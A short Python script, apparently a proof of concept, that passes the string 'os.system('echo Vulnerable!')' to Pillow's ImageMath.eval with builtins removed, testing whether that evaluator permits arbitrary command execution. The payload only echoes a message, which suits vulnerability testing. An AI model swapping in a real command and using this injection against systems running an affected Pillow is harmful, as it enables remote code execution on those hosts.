from PIL import ImageMath


env = {"__builtins__": None}
result = ImageMath.eval("os.system('echo Vulnerable!')", env=env)
print(result)